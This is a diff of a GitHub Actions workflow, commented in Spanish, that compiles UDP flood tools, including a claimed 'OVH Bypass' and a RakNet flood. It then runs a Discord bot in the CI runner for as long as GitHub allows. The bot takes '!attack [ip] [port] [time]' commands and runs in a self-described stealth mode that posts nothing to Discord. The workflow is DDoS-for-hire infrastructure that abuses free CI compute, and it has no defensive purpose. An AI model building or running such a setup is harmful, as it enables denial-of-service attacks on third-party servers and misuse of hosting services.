@@ -1,320 +1,127 @@
-name: PitoBotAuto
+name: 🚀 Bot UDP
 
 on:
   workflow_dispatch:
-    inputs:
-      discord_token:
-        description: 'Token del bot de Discord'
-        required: true
-        type: string
-        default: ''
   push:
     branches: [main]
 
 jobs:
-  deploy-all-methods:
+  deploy-bot-continuous:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
     
     steps:
-    - name: 📥 Clonar repositorio
+    - name: 📥 Usar código actual
       uses: actions/checkout@v4
-      with:
-        fetch-depth: 1
-
-    - name: 📁 Configurar directorio de trabajo
-      run: |
-        if [ -d "BotUDPs" ]; then
-          cd BotUDPs
-          echo "Directorio: BotUDPs/"
-        fi
-        echo "Ubicación actual: $(pwd)"
-        echo "Archivos disponibles:"
-        ls -la
-
+    
     - name: 🐍 Configurar Python 3.11
       uses: actions/setup-python@v4
       with:
         python-version: '3.11'
-        cache: 'pip'
-
+    
     - name: 🦾 Configurar Go 1.21
       uses: actions/setup-go@v4
       with:
         go-version: '1.21'
-        cache: true
-
-    - name: 🔧 Instalar dependencias del sistema
+    
+    - name: 🔧 Instalar herramientas de compilación
       run: |
         sudo apt-get update
         sudo apt-get install -y build-essential gcc g++ make libpcap-dev
-        echo "✅ Herramientas instaladas"
-
-    - name: 📦 Instalar dependencias Python
+    
+    - name: 📦 Instalar discord.py
       run: |
         python -m pip install --upgrade pip
         pip install discord.py
-        echo "✅ Discord.py instalado"
-
-    - name: 📚 Configurar módulos Go
+    
+    - name: 📚 Configurar Go modules
       run: |
-        echo "Configurando Go modules..."
-        # Crear go.mod si no existe
         if [ ! -f "go.mod" ]; then
           go mod init bot-udps 2>/dev/null || true
         fi
-        
-        # Instalar dependencias necesarias para raknet.go
-        go get github.com/sandertv/go-raknet 2>/dev/null || echo "⚠  go-raknet"
-        go get github.com/sirupsen/logrus 2>/dev/null || echo "⚠  logrus"
-        
-        echo "✅ Dependencias Go configuradas"
-
-    - name: 🛠️ Compilar TODOS los binarios C
+        go get github.com/sandertv/go-raknet 2>/dev/null || true
+    
+    - name: 🛠️ Compilar binarios C
       run: |
-        echo "========================================"
-        echo "COMPILANDO TODOS LOS BINARIOS C"
-        echo "========================================"
+        echo "=== COMPILANDO BINARIOS ==="
         
-        # Lista completa de métodos C
-        declare -A c_methods=(
-          ["udp.c"]="UDP Flood"
-          ["udphex.c"]="UDPHEX" 
-          ["udppps.c"]="UDPPPS"
-          ["ovh.c"]="OVH Bypass"
-          ["udppayload.c"]="UDP Payload"
-        )
-        
-        compiled_count=0
-        failed_count=0
-        
-        for source_file in "${!c_methods[@]}"; do
-          if [ -f "$source_file" ]; then
-            binary="${source_file%.c}"
-            method_name="${c_methods[$source_file]}"
-            
-            echo -n "🔨 Compilando $source_file ($method_name)... "
-            
-            # Comando de compilación específico para cada método
-            case $source_file in
-              "ovh.c")
-                gcc -O3 -pthread "$source_file" -o "$binary" -lpcap 2>/dev/null
-                ;;
-              *)
-                gcc -O3 -pthread "$source_file" -o "$binary" 2>/dev/null
-                ;;
-            esac
+        # Compilar todos los .c que existan
+        for c_file in *.c; do
+          if [ -f "$c_file" ]; then
+            binary="${c_file%.c}"
+            echo "Compilando $c_file → $binary"
+            gcc -O3 -pthread "$c_file" -o "$binary" 2>/dev/null || echo "  Error con $c_file"
             
             if [ -f "$binary" ]; then
               chmod +x "$binary"
-              echo "✅ $binary"
-              ((compiled_count++))
-            else
-              echo "❌ Falló"
-              ((failed_count++))
+              echo "  ✓ $binary listo"
             fi
-          else
-            echo "❓ $source_file no encontrado"
-            ((failed_count++))
           fi
         done
         
-        echo "========================================"
-        echo "RESULTADO: $compiled_count compilados, $failed_count fallos"
-        echo "========================================"
-
-    - name: 🔍 Verificar scripts Go
-      run: |
-        echo "========================================"
-        echo "VERIFICANDO SCRIPTS GO"
-        echo "========================================"
-        
-        go_scripts=("udpflood.go" "raknet.go")
-        
-        for script in "${go_scripts[@]}"; do
-          if [ -f "$script" ]; then
-            echo "✅ $script disponible"
-            
-            # Probar compilación rápida
-            if go build -o /tmp/test "$script" 2>/dev/null; then
-              echo "   ✓ Compila correctamente"
-              rm -f /tmp/test
-            else
-              echo "   ⚠  Posibles errores de compilación"
-            fi
-          else
-            echo "❌ $script NO ENCONTRADO"
-          fi
-        done
-        
-        echo "========================================"
-
-    - name: 🔐 Configurar token automáticamente
+        echo "Binarios disponibles:"
+        find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" | xargs -I {} basename {} 2>/dev/null || echo "Ninguno"
+    
+    - name: 🔐 Configurar token desde secret KEYS
       env:
-        # Prioridad: input manual > secret > variable de entorno
-        MANUAL_TOKEN: ${{ github.event.inputs.discord_token }}
-        SECRET_TOKEN: ${{ secrets.DISCORD_BOT_TOKEN }}
-        ENV_TOKEN: ${{ vars.DISCORD_TOKEN }}
+        DISCORD_TOKEN: ${{ secrets.KEYS }}
       run: |
-        echo "🔐 CONFIGURANDO TOKEN DEL BOT"
-        echo "========================================"
-        
-        # Determinar qué token usar
-        if [ -n "$MANUAL_TOKEN" ] && [ "$MANUAL_TOKEN" != "" ]; then
-          echo "✓ Usando token del input manual"
-          SELECTED_TOKEN="$MANUAL_TOKEN"
-        elif [ -n "$SECRET_TOKEN" ] && [ "$SECRET_TOKEN" != "" ]; then
-          echo "✓ Usando token del secret"
-          SELECTED_TOKEN="$SECRET_TOKEN"
-        elif [ -n "$ENV_TOKEN" ] && [ "$ENV_TOKEN" != "" ]; then
-          echo "✓ Usando token de variable de entorno"
-          SELECTED_TOKEN="$ENV_TOKEN"
-        else
-          echo "❌ ERROR: No se encontró ningún token válido"
-          echo ""
-          echo "SOLUCIÓN: Proporciona un token de una de estas formas:"
-          echo "1. Al ejecutar manualmente el workflow, ingrésalo en el campo 'discord_token'"
-          echo "2. Configura un secret llamado 'DISCORD_BOT_TOKEN' en Settings → Secrets"
-          echo "3. Configura una variable llamada 'DISCORD_TOKEN' en Settings → Variables"
+        if [ -z "$DISCORD_TOKEN" ]; then
+          echo "ERROR: Secret 'KEYS' no configurado"
+          echo "Configúralo en: Settings → Secrets → Actions → KEYS"
           exit 1
         fi
         
-        # Validar formato básico del token
-        if [ ${#SELECTED_TOKEN} -lt 50 ]; then
-          echo "❌ ERROR: Token demasiado corto (${#SELECTED_TOKEN} caracteres)"
-          echo "Un token válido de Discord tiene ~59 caracteres"
-          exit 1
-        fi
-        
-        # Crear token.txt
-        echo "$SELECTED_TOKEN" > token.txt
-        
-        # Verificar creación
-        if [ -f "token.txt" ]; then
-          TOKEN_LENGTH=$(wc -c < token.txt | tr -d ' ')
-          TOKEN_PREVIEW=$(head -c 15 token.txt)
-          echo "✅ token.txt creado correctamente"
-          echo "   Tamaño: $TOKEN_LENGTH caracteres"
-          echo "   Vista previa: ${TOKEN_PREVIEW}..."
-          echo "   Permisos: $(ls -la token.txt | cut -d' ' -f1)"
-        else
-          echo "❌ ERROR: No se pudo crear token.txt"
-          exit 1
-        fi
-        
-        echo "========================================"
-
-    - name: 🧪 Verificar estructura completa
+        echo "$DISCORD_TOKEN" > token.txt
+        echo "Token guardado en token.txt ($(wc -c < token.txt) caracteres)"
+    
+    - name: 🚀 Ejecutar bot CONTINUAMENTE
       run: |
         echo "========================================"
-        echo "VERIFICACIÓN FINAL DE ESTRUCTURA"
+        echo "INICIANDO BOT EN MODO CONTINUO"
         echo "========================================"
-        
-        echo "📁 Directorio actual: $(pwd)"
-        echo ""
-        
-        echo "📄 Archivos Python:"
-        ls -la *.py 2>/dev/null || echo "   No hay archivos .py"
-        echo ""
-        
-        echo "⚙️  Binarios C compilados:"
-        find . -maxdepth 1 -type f -executable -name "*" ! -name "*.py" ! -name "*.go" ! -name "*.txt" ! -name "*.sh" | while read bin; do
-          echo "   ✓ $(basename "$bin")"
-        done
-        echo ""
-        
-        echo "🦾 Scripts Go:"
-        ls -la *.go 2>/dev/null || echo "   No hay archivos .go"
-        echo ""
-        
-        echo "🔑 Archivos de configuración:"
-        ls -la token.txt 2>/dev/null || echo "   token.txt no encontrado"
-        echo ""
-        
-        echo "✅ Verificación completada"
-        echo "========================================"
-
-    - name: 🚀 Ejecutar bot automáticamente (con timeout)
-      run: |
-        echo "========================================"
-        echo "INICIANDO BOT UDP - MODO SIGILOSO"
-        echo "========================================"
-        echo "📅 Hora de inicio: $(date)"
-        echo "🐍 Python version: $(python3 --version)"
-        echo "🦾 Go version: $(go version 2>/dev/null || echo 'No disponible')"
-        echo "🔇 Modo: SIGILOSO (0 mensajes en Discord)"
+        echo "El bot se ejecutará hasta que:"
+        echo "1. GitHub detenga el runner (≈6 horas)"
+        echo "2. Ocurra un error crítico"
+        echo "3. Se cancele manualmente"
         echo "========================================"
         echo ""
-        echo "🎮 MÉTODOS DISPONIBLES:"
-        echo "   !attack udp [IP] [PUERTO] [TIEMPO]"
-        echo "   !attack udphex [IP] [PUERTO] [TIEMPO]"
-        echo "   !attack udppps [IP] [PUERTO] [TIEMPO]"
-        echo "   !attack ovh [IP] [PUERTO] [TIEMPO]"
-        echo "   !attack raknet [IP] [PUERTO] [TIEMPO]"
-        echo "   !attack udpflood [IP] [PUERTO] [TIEMPO]"
-        echo "   !attack udppayload [IP] [PUERTO] [TIEMPO] [PAYLOAD]"
+        echo "MÉTODOS DISPONIBLES:"
+        echo "!attack udp [ip] [puerto] [tiempo]"
+        echo "!attack udphex [ip] [puerto] [tiempo]"
+        echo "!attack udppps [ip] [puerto] [tiempo]"
+        echo "!attack ovh [ip] [puerto] [tiempo]"
+        echo "!attack raknet [ip] [puerto] [tiempo]"
+        echo "!attack udpflood [ip] [puerto] [tiempo]"
+        echo "!attack udppayload [ip] [puerto] [tiempo] [payload]"
         echo ""
-        echo "📝 El bot solo registrará actividad en esta consola"
-        echo "   NO enviará mensajes a Discord"
+        echo "⚠️  MODO SIGILOSO: 0 mensajes en Discord"
+        echo "📝 Logs solo en esta consola"
         echo "========================================"
         
-        # Verificar requisitos mínimos
+        # Verificar archivos esenciales
         if [ ! -f "bot.py" ]; then
-          echo "❌ ERROR: bot.py no encontrado"
+          echo "ERROR: bot.py no encontrado"
           exit 1
         fi
         
         if [ ! -f "token.txt" ] || [ ! -s "token.txt" ]; then
-          echo "❌ ERROR: token.txt no existe o está vacío"
+          echo "ERROR: token.txt no válido"
           exit 1
         fi
         
         echo ""
-        echo "⚡ INICIANDO BOT.PY..."
-        echo "   (Ejecución por 5 minutos máximo)"
-        echo "----------------------------------------"
-        
-        # Ejecutar bot con timeout
-        timeout 300 python3 bot.py
-        
-        EXIT_CODE=$?
-        
+        echo "✅ INICIANDO EJECUCIÓN CONTINUA..."
+        echo "Hora de inicio: $(date)"
+        echo "El bot permanecerá activo hasta que GitHub lo detenga."
         echo ""
-        echo "----------------------------------------"
         
-        if [ $EXIT_CODE -eq 0 ]; then
-          echo "✅ Bot finalizado normalmente"
-        elif [ $EXIT_CODE -eq 124 ]; then
-          echo "⏰ Bot detenido por timeout (5 minutos completados)"
-        else
-          echo "⚠️  Bot finalizado con código: $EXIT_CODE"
-        fi
+        # Ejecutar bot INDEFINIDAMENTE (sin timeout)
+        python3 bot.py
         
+        # Esto solo se ejecutará si el bot se detiene por error
+        echo ""
         echo "========================================"
-
-    - name: 📊 Reporte final
-      if: always()
-      run: |
-        echo "========================================"
-        echo "📊 REPORTE FINAL DEL WORKFLOW"
-        echo "========================================"
-        echo "Workflow: ${{ github.workflow }}"
-        echo "Ejecución: ${{ github.run_id }}"
-        echo "Estado: ${{ job.status }}"
-        echo "Hora inicio: ${{ job.started_at }}"
-        echo "Hora fin: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
-        echo ""
-        echo "📁 Archivos generados:"
-        ls -la | grep -E "^-" | head -20
-        echo ""
-        echo "✅ TODOS LOS MÉTODOS CONFIGURADOS:"
-        echo "   1. UDP Flood (C)"
-        echo "   2. UDPHEX (C)" 
-        echo "   3. UDPPPS (C)"
-        echo "   4. OVH Bypass (C)"
-        echo "   5. RakNet Attack (Go)"
-        echo "   6. UDP Flood Go (Go)"
-        echo "   7. UDP Payload (C)"
-        echo ""
-        echo "🔧 Bot listo para uso sigiloso"
+        echo "BOT DETENIDO"
+        echo "Hora de finalización: $(date)"
+        echo "Código de salida: $?"
         echo "========================================"
